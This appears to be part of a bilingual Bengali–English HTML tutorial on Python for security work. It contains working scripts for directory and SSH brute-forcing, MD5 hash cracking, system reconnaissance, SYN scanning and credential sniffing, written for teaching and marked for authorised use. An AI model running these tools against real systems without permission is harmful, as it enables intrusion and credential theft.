+    <span class="kw">for</span> word <span class="kw">in</span> words:
+        target_url = <span class="s">f"{url}/{word}"</span>
+        <span class="kw">try</span>:
+            r = requests.get(target_url, timeout=<span class="num">3</span>)
+            <span class="kw">if</span> r.status_code <span class="kw">not</span> <span class="kw">in</span> [<span class="num">404</span>, <span class="num">403</span>]:
+                <span class="kw">print</span>(<span class="s">f"  [{r.status_code}] {target_url}"</span>)
+                found.append(target_url)
+        <span class="kw">except</span>:
+            <span class="kw">pass</span>
+
+    <span class="kw">print</span>(<span class="s">f"\n✅ Found: {len(found)} paths"</span>)
+    <span class="kw">return</span> found
+
+<span class="c"># চালাও</span>
+dir_brute(<span class="s">"http://target.com"</span>, <span class="s">"wordlist.txt"</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">BeautifulSoup — HTML Parser</span><span class="en-text">BeautifulSoup — HTML Parser</span></h2>
+    <div class="code">
+<span class="kw">import</span> requests
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+
+r = requests.get(<span class="s">"https://example.com"</span>)
+soup = BeautifulSoup(r.text, <span class="s">"html.parser"</span>)
+
+<span class="c"># Links সংগ্রহ করা</span>
+links = []
+<span class="kw">for</span> a <span class="kw">in</span> soup.find_all(<span class="s">"a"</span>, href=<span class="kw">True</span>):
+    links.append(a[<span class="s">"href"</span>])
+<span class="kw">print</span>(links)
+
+<span class="c"># Forms খোঁজা (login page analysis)</span>
+<span class="kw">for</span> form <span class="kw">in</span> soup.find_all(<span class="s">"form"</span>):
+    <span class="kw">print</span>(<span class="s">"Form action:"</span>, form.get(<span class="s">"action"</span>))
+    <span class="kw">for</span> inp <span class="kw">in</span> form.find_all(<span class="s">"input"</span>):
+        <span class="kw">print</span>(<span class="s">"  Input:"</span>, inp.get(<span class="s">"name"</span>), inp.get(<span class="s">"type"</span>))
+
+<span class="c"># Title, meta tags</span>
+<span class="kw">print</span>(soup.title.text)
+<span class="kw">print</span>(soup.find(<span class="s">"meta"</span>, {<span class="s">"name"</span>:<span class="s">"description"</span>}))
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 8: PASSWORD & HASHING
+══════════════════════════════════════ -->
+<div class="chapter ch8">
+  <div class="chapter-header" data-num="08">
+    <div class="ch-label">CHAPTER 08</div>
+    <div class="ch-title">🔑 <span class="bn-text">Password ও Hashing Tools</span><span class="en-text">Password & Hashing Tools</span></div>
+    <div class="ch-desc"><span class="bn-text">hashlib দিয়ে hash তৈরি, Hash Cracker ও Password Generator লেখা</span><span class="en-text">Creating hashes with hashlib, writing a Hash Cracker and Password Generator</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">hashlib — Hash তৈরি করা</span><span class="en-text">hashlib — Creating Hashes</span></h2>
+    <div class="code">
+<span class="kw">import</span> hashlib
+
+password = <span class="s">"admin123"</span>
+
+<span class="c"># MD5 hash</span>
+md5 = hashlib.md5(password.encode()).hexdigest()
+<span class="kw">print</span>(<span class="s">f"MD5:    {md5}"</span>)
+
+<span class="c"># SHA1 hash</span>
+sha1 = hashlib.sha1(password.encode()).hexdigest()
+<span class="kw">print</span>(<span class="s">f"SHA1:   {sha1}"</span>)
+
+<span class="c"># SHA256 hash</span>
+sha256 = hashlib.sha256(password.encode()).hexdigest()
+<span class="kw">print</span>(<span class="s">f"SHA256: {sha256}"</span>)
+
+<span class="c"># File hash (integrity check)</span>
+<span class="kw">def</span> <span class="f">file_hash</span>(filepath):
+    h = hashlib.sha256()
+    <span class="kw">with</span> <span class="f">open</span>(filepath, <span class="s">"rb"</span>) <span class="kw">as</span> f:
+        <span class="kw">while</span> chunk := f.read(<span class="num">8192</span>):
+            h.update(chunk)
+    <span class="kw">return</span> h.hexdigest()
+
+<span class="kw">print</span>(file_hash(<span class="s">"/etc/passwd"</span>))
+    </div>
+    <div class="output">MD5:    0192023a7bbd73250516f069df18b500
+SHA1:   f865b53623b121fd34ee5426c792e5c33af8c227
+SHA256: 240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9</div>
+
+    <h2 class="sec"><span class="bn-text">🔥 Hash Cracker তৈরি</span><span class="en-text">🔥 Build a Hash Cracker</span></h2>
+    <div class="code">
+<span class="kw">import</span> hashlib
+<span class="kw">import</span> sys
+
+<span class="kw">def</span> <span class="f">crack_md5</span>(target_hash, wordlist):
+    <span class="kw">print</span>(<span class="s">f"🔍 Cracking: {target_hash}"</span>)
+    <span class="kw">with</span> <span class="f">open</span>(wordlist, <span class="s">"r"</span>, encoding=<span class="s">"latin-1"</span>) <span class="kw">as</span> f:
+        <span class="kw">for</span> line <span class="kw">in</span> f:
+            word = line.strip()
+            hashed = hashlib.md5(word.encode()).hexdigest()
+            <span class="kw">if</span> hashed == target_hash:
+                <span class="kw">print</span>(<span class="s">f"✅ CRACKED! Password: {word}"</span>)
+                <span class="kw">return</span> word
+    <span class="kw">print</span>(<span class="s">"❌ Not found in wordlist"</span>)
+    <span class="kw">return</span> <span class="kw">None</span>
+
+<span class="c"># চালাও — admin123-এর MD5</span>
+crack_md5(<span class="s">"0192023a7bbd73250516f069df18b500"</span>, <span class="s">"rockyou.txt"</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Password Generator তৈরি</span><span class="en-text">Build a Password Generator</span></h2>
+    <div class="code">
+<span class="kw">import</span> random
+<span class="kw">import</span> string
+<span class="kw">import</span> secrets   <span class="c"># Cryptographically secure</span>
+
+<span class="kw">def</span> <span class="f">generate_password</span>(length=<span class="num">16</span>, use_symbols=<span class="kw">True</span>):
+    chars = string.ascii_letters + string.digits
+    <span class="kw">if</span> use_symbols:
+        chars += string.punctuation
+    <span class="c"># secrets.choice — cryptographically secure random</span>
+    password = <span class="s">""</span>.join(secrets.choice(chars) <span class="kw">for</span> _ <span class="kw">in</span> <span class="f">range</span>(length))
+    <span class="kw">return</span> password
+
+<span class="kw">for</span> _ <span class="kw">in</span> <span class="f">range</span>(<span class="num">5</span>):
+    <span class="kw">print</span>(generate_password(<span class="num">20</span>))
+    </div>
+    <div class="output">Kx#9mP@2Lq!vN7rTw&Ys
+$4Bj^uF8cH3nG6dZ%eWm
+pR!7xK2@LvN9mQ#5tJb&
+Zs%4qM8#KwP2vG7jN!eR
+H6@nWx3$bT9mK!pQ5rLv</div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 9: OS & SYSTEM INTERACTION
+══════════════════════════════════════ -->
+<div class="chapter ch9">
+  <div class="chapter-header" data-num="09">
+    <div class="ch-label">CHAPTER 09</div>
+    <div class="ch-title">💻 <span class="bn-text">OS ও System Interaction</span><span class="en-text">OS & System Interaction</span></div>
+    <div class="ch-desc"><span class="bn-text">os, subprocess দিয়ে system command চালানো ও System Recon Script লেখা</span><span class="en-text">Running system commands with os/subprocess and writing a System Recon Script</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">subprocess — Command চালানো</span><span class="en-text">subprocess — Running Commands</span></h2>
+    <div class="code">
+<span class="kw">import</span> subprocess
+
+<span class="c"># Command চালানো এবং output পাওয়া</span>
+result = subprocess.run(
+    [<span class="s">"nmap"</span>, <span class="s">"-sV"</span>, <span class="s">"192.168.1.1"</span>],
+    capture_output=<span class="kw">True</span>,
+    text=<span class="kw">True</span>
+)
+<span class="kw">print</span>(result.stdout)    <span class="c"># Output</span>
+<span class="kw">print</span>(result.returncode) <span class="c"># 0 = success</span>
+
+<span class="c"># Shell command (সতর্কতার সাথে ব্যবহার করো)</span>
+output = subprocess.getoutput(<span class="s">"whoami"</span>)
+<span class="kw">print</span>(output)
+
+output = subprocess.getoutput(<span class="s">"ip addr show"</span>)
+<span class="kw">print</span>(output)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">🔥 System Recon Script</span><span class="en-text">🔥 System Recon Script</span></h2>
+    <div class="code">
+<span class="kw">import</span> os
+<span class="kw">import</span> subprocess
+<span class="kw">import</span> socket
+<span class="kw">import</span> platform
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+<span class="kw">def</span> <span class="f">run_cmd</span>(cmd):
+    <span class="kw">try</span>:
+        <span class="kw">return</span> subprocess.getoutput(cmd)
+    <span class="kw">except</span>:
+        <span class="kw">return</span> <span class="s">"N/A"</span>
+
+<span class="kw">def</span> <span class="f">recon</span>():
+    <span class="kw">print</span>(<span class="s">"="</span> * <span class="num">50</span>)
+    <span class="kw">print</span>(<span class="s">" 🔍 SYSTEM RECON REPORT"</span>)
+    <span class="kw">print</span>(<span class="s">f" Time: {datetime.now()}"</span>)
+    <span class="kw">print</span>(<span class="s">"="</span> * <span class="num">50</span>)
+
+    <span class="c"># System info</span>
+    <span class="kw">print</span>(<span class="s">"\n[+] SYSTEM"</span>)
+    <span class="kw">print</span>(<span class="s">f"  OS:       {platform.system()} {platform.release()}"</span>)
+    <span class="kw">print</span>(<span class="s">f"  Hostname: {socket.gethostname()}"</span>)
+    <span class="kw">print</span>(<span class="s">f"  User:     {run_cmd('whoami')}"</span>)
+
+    <span class="c"># Network info</span>
+    <span class="kw">print</span>(<span class="s">"\n[+] NETWORK"</span>)
+    <span class="kw">print</span>(<span class="s">f"  IP:       {run_cmd('hostname -I')}"</span>)
+    <span class="kw">print</span>(<span class="s">f"  Gateway:  {run_cmd('ip route | grep default')}"</span>)
+
+    <span class="c"># Listening ports</span>
+    <span class="kw">print</span>(<span class="s">"\n[+] OPEN PORTS"</span>)
+    <span class="kw">print</span>(run_cmd(<span class="s">"ss -tulpn | grep LISTEN"</span>))
+
+    <span class="c"># Users</span>
+    <span class="kw">print</span>(<span class="s">"\n[+] USERS WITH SHELL"</span>)
+    <span class="kw">print</span>(run_cmd(<span class="s">"grep -v nologin /etc/passwd | grep -v false"</span>))
+
+    <span class="c"># SUID files</span>
+    <span class="kw">print</span>(<span class="s">"\n[+] SUID FILES"</span>)
+    <span class="kw">print</span>(run_cmd(<span class="s">"find / -perm -u=s -type f 2>/dev/null | head -10"</span>))
+
+recon()
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Log Parser — Security Logs বিশ্লেষণ</span><span class="en-text">Log Parser — Analyzing Security Logs</span></h2>
+    <div class="code">
+<span class="kw">import</span> re
+<span class="kw">from</span> collections <span class="kw">import</span> Counter
+
+<span class="kw">def</span> <span class="f">parse_auth_log</span>(logfile=<span class="s">"/var/log/auth.log"</span>):
+    failed_ips = []
+    <span class="kw">try</span>:
+        <span class="kw">with</span> <span class="f">open</span>(logfile) <span class="kw">as</span> f:
+            <span class="kw">for</span> line <span class="kw">in</span> f:
+                <span class="kw">if</span> <span class="s">"Failed password"</span> <span class="kw">in</span> line:
+                    ip = re.search(<span class="s">r'from (\S+)'</span>, line)
+                    <span class="kw">if</span> ip:
+                        failed_ips.append(ip.group(<span class="num">1</span>))
+
+        counts = Counter(failed_ips)
+        <span class="kw">print</span>(<span class="s">"🚨 Top Attackers (Failed SSH Logins):"</span>)
+        <span class="kw">for</span> ip, count <span class="kw">in</span> counts.most_common(<span class="num">10</span>):
+            <span class="kw">print</span>(<span class="s">f"  {ip:20s} → {count} attempts"</span>)
+    <span class="kw">except</span> FileNotFoundError:
+        <span class="kw">print</span>(<span class="s">"Log file not found"</span>)
+
+parse_auth_log()
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 10: AUTOMATION
+══════════════════════════════════════ -->
+<div class="chapter ch10">
+  <div class="chapter-header" data-num="10">
+    <div class="ch-label">CHAPTER 10</div>
+    <div class="ch-title">🤖 <span class="bn-text">Security Automation Scripts</span><span class="en-text">Security Automation Scripts</span></div>
+    <div class="ch-desc"><span class="bn-text">Real-world security কাজে Python automation — Network Scanner, Brute Forcer</span><span class="en-text">Python automation for real-world security tasks — Network Scanner, Brute Forcer</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Network Host Discovery</span><span class="en-text">Network Host Discovery</span></h2>
+    <div class="code">
+<span class="kw">import</span> subprocess
+<span class="kw">import</span> threading
+<span class="kw">import</span> ipaddress
+
+live_hosts = []
+lock = threading.Lock()
+
+<span class="kw">def</span> <span class="f">ping_host</span>(ip):
+    result = subprocess.run(
+        [<span class="s">"ping"</span>, <span class="s">"-c"</span>, <span class="s">"1"</span>, <span class="s">"-W"</span>, <span class="s">"1"</span>, <span class="f">str</span>(ip)],
+        capture_output=<span class="kw">True</span>
+    )
+    <span class="kw">if</span> result.returncode == <span class="num">0</span>:
+        <span class="kw">with</span> lock:
+            live_hosts.append(<span class="f">str</span>(ip))
+            <span class="kw">print</span>(<span class="s">f"  ✅ {ip} is ALIVE"</span>)
+
+network = ipaddress.IPv4Network(<span class="s">"192.168.1.0/24"</span>, strict=<span class="kw">False</span>)
+threads = []
+<span class="kw">for</span> ip <span class="kw">in</span> network.hosts():
+    t = threading.Thread(target=ping_host, args=(ip,))
+    threads.append(t)
+    t.start()
+
+<span class="kw">for</span> t <span class="kw">in</span> threads:
+    t.join()
+
+<span class="kw">print</span>(<span class="s">f"\n[+] Found {len(live_hosts)} live hosts"</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">SSH Brute Force Script</span><span class="en-text">SSH Brute Force Script</span></h2>
+    <div class="box danger">
+      <div class="box-t">⚠️ <span class="bn-text">শুধুমাত্র নিজের সিস্টেমে বা অনুমতি নিয়ে ব্যবহার করো!</span><span class="en-text">Use only on your own system or with explicit permission!</span></div>
+    </div>
+    <div class="code">
+<span class="kw">import</span> paramiko   <span class="c"># pip install paramiko</span>
+<span class="kw">import</span> sys
+
+<span class="kw">def</span> <span class="f">ssh_brute</span>(host, username, wordlist):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    <span class="kw">with</span> <span class="f">open</span>(wordlist) <span class="kw">as</span> f:
+        <span class="kw">for</span> line <span class="kw">in</span> f:
+            password = line.strip()
+            <span class="kw">try</span>:
+                client.connect(host, username=username,
+                               password=password, timeout=<span class="num">3</span>)
+                <span class="kw">print</span>(<span class="s">f"✅ SUCCESS! Password: {password}"</span>)
+                client.close()
+                <span class="kw">return</span> password
+            <span class="kw">except</span> paramiko.AuthenticationException:
+                <span class="kw">print</span>(<span class="s">f"  [-] {password}"</span>)
+            <span class="kw">except</span> Exception <span class="kw">as</span> e:
+                <span class="kw">print</span>(<span class="s">f"  [!] Error: {e}"</span>)
+                <span class="kw">break</span>
+
+    <span class="kw">print</span>(<span class="s">"❌ Password not found"</span>)
+    <span class="kw">return</span> <span class="kw">None</span>
+
+ssh_brute(<span class="s">"192.168.1.1"</span>, <span class="s">"root"</span>, <span class="s">"rockyou.txt"</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Subdomain Enumerator</span><span class="en-text">Subdomain Enumerator</span></h2>
+    <div class="code">
+<span class="kw">import</span> requests
+<span class="kw">import</span> threading
+
+found = []
+lock = threading.Lock()
+
+<span class="kw">def</span> <span class="f">check_subdomain</span>(domain, sub):
+    url = <span class="s">f"http://{sub}.{domain}"</span>
+    <span class="kw">try</span>:
+        r = requests.get(url, timeout=<span class="num">2</span>)
+        <span class="kw">with</span> lock:
+            found.append(url)
+            <span class="kw">print</span>(<span class="s">f"  ✅ [{r.status_code}] {url}"</span>)
+    <span class="kw">except</span>:
+        <span class="kw">pass</span>
+
+domain = <span class="s">"target.com"</span>
+subdomains = [<span class="s">"www"</span>, <span class="s">"mail"</span>, <span class="s">"ftp"</span>, <span class="s">"admin"</span>, <span class="s">"dev"</span>,
+              <span class="s">"api"</span>, <span class="s">"test"</span>, <span class="s">"staging"</span>, <span class="s">"vpn"</span>, <span class="s">"portal"</span>]
+
+threads = [threading.Thread(target=check_subdomain, args=(domain, s))
+           <span class="kw">for</span> s <span class="kw">in</span> subdomains]
+<span class="kw">for</span> t <span class="kw">in</span> threads: t.start()
+<span class="kw">for</span> t <span class="kw">in</span> threads: t.join()
+<span class="kw">print</span>(<span class="s">f"\n[+] Found: {len(found)} subdomains"</span>)
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 11: SECURITY LIBRARIES
+══════════════════════════════════════ -->
+<div class="chapter ch11">
+  <div class="chapter-header" data-num="11">
+    <div class="ch-label">CHAPTER 11</div>
+    <div class="ch-title">🛡️ <span class="bn-text">Security Libraries — Advanced</span><span class="en-text">Security Libraries — Advanced</span></div>
+    <div class="ch-desc"><span class="bn-text">scapy, pwntools, cryptography — Professional Security Tool-এর Libraries</span><span class="en-text">scapy, pwntools, cryptography — Libraries for professional security tools</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Scapy — Packet Manipulation</span><span class="en-text">Scapy — Packet Manipulation</span></h2>
+    <div class="code">
+<span class="kw">from</span> scapy.all <span class="kw">import</span> *   <span class="c"># pip install scapy</span>
+
+<span class="c"># ICMP Ping</span>
+pkt = IP(dst=<span class="s">"8.8.8.8"</span>) / ICMP()
+response = sr1(pkt, timeout=<span class="num">2</span>, verbose=<span class="kw">False</span>)
+<span class="kw">if</span> response:
+    <span class="kw">print</span>(<span class="s">f"✅ Host is ALIVE: {response.src}"</span>)
+
+<span class="c"># TCP SYN Scan (Stealth Scan)</span>
+<span class="kw">def</span> <span class="f">syn_scan</span>(target, port):
+    pkt = IP(dst=target) / TCP(dport=port, flags=<span class="s">"S"</span>)
+    resp = sr1(pkt, timeout=<span class="num">1</span>, verbose=<span class="kw">False</span>)
+    <span class="kw">if</span> resp <span class="kw">and</span> resp.haslayer(TCP):
+        <span class="kw">if</span> resp[TCP].flags == <span class="num">0x12</span>:    <span class="c"># SYN-ACK</span>
+            <span class="kw">return</span> <span class="s">"OPEN"</span>
+        <span class="kw">elif</span> resp[TCP].flags == <span class="num">0x14</span>:  <span class="c"># RST-ACK</span>
+            <span class="kw">return</span> <span class="s">"CLOSED"</span>
+    <span class="kw">return</span> <span class="s">"FILTERED"</span>
+
+<span class="kw">print</span>(syn_scan(<span class="s">"192.168.1.1"</span>, <span class="num">80</span>))
+
+<span class="c"># Packet Sniffing</span>
+<span class="kw">def</span> <span class="f">packet_handler</span>(pkt):
+    <span class="kw">if</span> pkt.haslayer(TCP) <span class="kw">and</span> pkt.haslayer(Raw):
+        data = pkt[Raw].load.decode(<span class="s">"utf-8"</span>, errors=<span class="s">"ignore"</span>)
+        <span class="kw">if</span> <span class="s">"password"</span> <span class="kw">in</span> data.lower():
+            <span class="kw">print</span>(<span class="s">f"[!] Possible creds: {data}"</span>)
+
+sniff(iface=<span class="s">"eth0"</span>, prn=packet_handler, filter=<span class="s">"tcp port 80"</span>, count=<span class="num">100</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">cryptography — Encryption</span><span class="en-text">cryptography — Encryption</span></h2>
+    <div class="code">
+<span class="kw">from</span> cryptography.fernet <span class="kw">import</span> Fernet   <span class="c"># pip install cryptography</span>
+
+<span class="c"># Key তৈরি করা</span>
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+<span class="c"># Encrypt</span>
+message = <span class="s">b"secret password: admin123"</span>
+encrypted = cipher.encrypt(message)
+<span class="kw">print</span>(<span class="s">f"Encrypted: {encrypted}"</span>)
+
+<span class="c"># Decrypt</span>
+decrypted = cipher.decrypt(encrypted)
+<span class="kw">print</span>(<span class="s">f"Decrypted: {decrypted.decode()}"</span>)
+
+<span class="c"># File encrypt করা</span>
+<span class="kw">def</span> <span class="f">encrypt_file</span>(filepath, key):
+    f = Fernet(key)
+    <span class="kw">with</span> <span class="f">open</span>(filepath, <span class="s">"rb"</span>) <span class="kw">as</span> fh:
+        data = fh.read()
+    encrypted_data = f.encrypt(data)
+    <span class="kw">with</span> <span class="f">open</span>(filepath + <span class="s">".enc"</span>, <span class="s">"wb"</span>) <span class="kw">as</span> fh:
+        fh.write(encrypted_data)
+    <span class="kw">print</span>(<span class="s">f"✅ Encrypted: {filepath}.enc"</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">pwntools — CTF ও Exploit Development</span><span class="en-text">pwntools — CTF & Exploit Development</span></h2>
+    <div class="code">
+<span class="kw">from</span> pwn <span class="kw">import</span> *    <span class="c"># pip install pwntools</span>
+
+<span class="c"># Remote connection</span>
+conn = remote(<span class="s">"target.com"</span>, <span class="num">1337</span>)
+conn.recvline()                   <span class="c"># Banner পড়া</span>
+conn.sendline(<span class="s">b"HELLO"</span>)
+response = conn.recvall()
+conn.close()
+
+<span class="c"># Format string ও packing</span>
+addr = <span class="num">0xdeadbeef</span>
+<span class="kw">print</span>(p32(addr))    <span class="c"># 32-bit pack</span>
+<span class="kw">print</span>(p64(addr))    <span class="c"># 64-bit pack</span>
+<span class="kw">print</span>(<span class="f">hex</span>(u32(b<span class="s">"\xef\xbe\xad\xde"</span>)))  <span class="c"># unpack</span>
+
+<span class="c"># Cyclic pattern (Buffer overflow offset খোঁজা)</span>
+pattern = cyclic(<span class="num">200</span>)
+<span class="kw">print</span>(pattern)
+offset = cyclic_find(<span class="num">0x61616166</span>)
+<span class="kw">print</span>(<span class="s">f"Offset: {offset}"</span>)
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 12: CHEAT SHEET
+══════════════════════════════════════ -->
+<div class="chapter ch12">
+  <div class="chapter-header" data-num="12">
+    <div class="ch-label">CHAPTER 12</div>
+    <div class="ch-title">📋 <span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div>
+    <div class="ch-desc"><span class="bn-text">Python syntax, built-in functions ও security commands — সব এক জায়গায়</span><span class="en-text">Python syntax, built-in functions and security commands — all in one place</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Python Basics Cheat Sheet</span><span class="en-text">Python Basics Cheat Sheet</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#c0392b;"><span class="bn-text">Data Types</span><span class="en-text">Data Types</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = 42</span><span class="cheat-desc">int</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = 3.14</span><span class="cheat-desc">float</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = "hello"</span><span class="cheat-desc">string</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = True/False</span><span class="cheat-desc">bool</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = [1, 2, 3]</span><span class="cheat-desc">list</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = (1, 2, 3)</span><span class="cheat-desc">tuple</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = {"k": "v"}</span><span class="cheat-desc">dict</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x = {1, 2, 3}</span><span class="cheat-desc">set</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#2980b9;">String Methods</div>
+        <div class="cheat-row"><span class="cheat-cmd">s.upper()</span><span class="cheat-desc"><span class="bn-text">বড় হাতে</span><span class="en-text">Uppercase</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.lower()</span><span class="cheat-desc"><span class="bn-text">ছোট হাতে</span><span class="en-text">Lowercase</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.strip()</span><span class="cheat-desc"><span class="bn-text">whitespace বাদ</span><span class="en-text">Remove whitespace</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.split("/")</span><span class="cheat-desc"><span class="bn-text">ভাগ করা</span><span class="en-text">Split</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.replace(a, b)</span><span class="cheat-desc"><span class="bn-text">প্রতিস্থাপন</span><span class="en-text">Replace</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">"x" in s</span><span class="cheat-desc"><span class="bn-text">আছে কি না</span><span class="en-text">Contains check</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s[0:5]</span><span class="cheat-desc"><span class="bn-text">অংশ নেওয়া</span><span class="en-text">Slicing</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">f"hello {x}"</span><span class="cheat-desc">f-string</span></div>
+      </div>
+    </div>
+
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#27ae60;">List Methods</div>
+        <div class="cheat-row"><span class="cheat-cmd">lst.append(x)</span><span class="cheat-desc"><span class="bn-text">শেষে যোগ</span><span class="en-text">Add to end</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">lst.remove(x)</span><span class="cheat-desc"><span class="bn-text">বাদ দেওয়া</span><span class="en-text">Remove item</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">lst.sort()</span><span class="cheat-desc"><span class="bn-text">সাজানো</span><span class="en-text">Sort</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">len(lst)</span><span class="cheat-desc"><span class="bn-text">সংখ্যা গণনা</span><span class="en-text">Count items</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">lst[0]</span><span class="cheat-desc"><span class="bn-text">প্রথম item</span><span class="en-text">First item</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">lst[-1]</span><span class="cheat-desc"><span class="bn-text">শেষ item</span><span class="en-text">Last item</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x in lst</span><span class="cheat-desc"><span class="bn-text">আছে কি না</span><span class="en-text">Contains check</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">[x for x in lst]</span><span class="cheat-desc">List comprehension</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#8e44ad;">Control Flow</div>
+        <div class="cheat-row"><span class="cheat-cmd">if x: ... else: ...</span><span class="cheat-desc"><span class="bn-text">শর্ত</span><span class="en-text">Condition</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">for x in list: ...</span><span class="cheat-desc"><span class="bn-text">তালিকা loop</span><span class="en-text">List loop</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">while cond: ...</span><span class="cheat-desc"><span class="bn-text">শর্ত loop</span><span class="en-text">Condition loop</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">break</span><span class="cheat-desc"><span class="bn-text">loop বন্ধ</span><span class="en-text">Exit loop</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">continue</span><span class="cheat-desc"><span class="bn-text">skip</span><span class="en-text">Skip iteration</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">range(1, 11)</span><span class="cheat-desc">1 → 10</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">try: ... except:</span><span class="cheat-desc"><span class="bn-text">error ধরা</span><span class="en-text">Catch error</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">def fn(x): return x</span><span class="cheat-desc"><span class="bn-text">function</span><span class="en-text">Function</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Security Module Cheat Sheet</span><span class="en-text">Security Module Cheat Sheet</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#c0392b;">socket</div>
+        <div class="cheat-row"><span class="cheat-cmd">socket.socket()</span><span class="cheat-desc"><span class="bn-text">socket তৈরি</span><span class="en-text">Create socket</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.connect((ip, port))</span><span class="cheat-desc"><span class="bn-text">connect</span><span class="en-text">Connect</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.connect_ex()</span><span class="cheat-desc"><span class="bn-text">0=open</span><span class="en-text">0=open</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.recv(1024)</span><span class="cheat-desc"><span class="bn-text">data পড়া</span><span class="en-text">Read data</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.send(b"data")</span><span class="cheat-desc"><span class="bn-text">data পাঠানো</span><span class="en-text">Send data</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.settimeout(3)</span><span class="cheat-desc"><span class="bn-text">timeout set</span><span class="en-text">Set timeout</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">s.close()</span><span class="cheat-desc"><span class="bn-text">বন্ধ করা</span><span class="en-text">Close</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#d35400;">hashlib</div>
+        <div class="cheat-row"><span class="cheat-cmd">hashlib.md5(x).hexdigest()</span><span class="cheat-desc">MD5</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashlib.sha1(x).hexdigest()</span><span class="cheat-desc">SHA1</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashlib.sha256(x).hexdigest()</span><span class="cheat-desc">SHA256</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x.encode()</span><span class="cheat-desc"><span class="bn-text">str → bytes</span><span class="en-text">str → bytes</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">x.decode()</span><span class="cheat-desc"><span class="bn-text">bytes → str</span><span class="en-text">bytes → str</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashlib.algorithms_available</span><span class="cheat-desc"><span class="bn-text">সব algorithm</span><span class="en-text">All algorithms</span></span></div>
+      </div>
+    </div>
+
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#2980b9;">requests</div>
+        <div class="cheat-row"><span class="cheat-cmd">requests.get(url)</span><span class="cheat-desc">GET request</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">requests.post(url, data={})</span><span class="cheat-desc">POST request</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">r.status_code</span><span class="cheat-desc">200, 404, 403...</span></div>
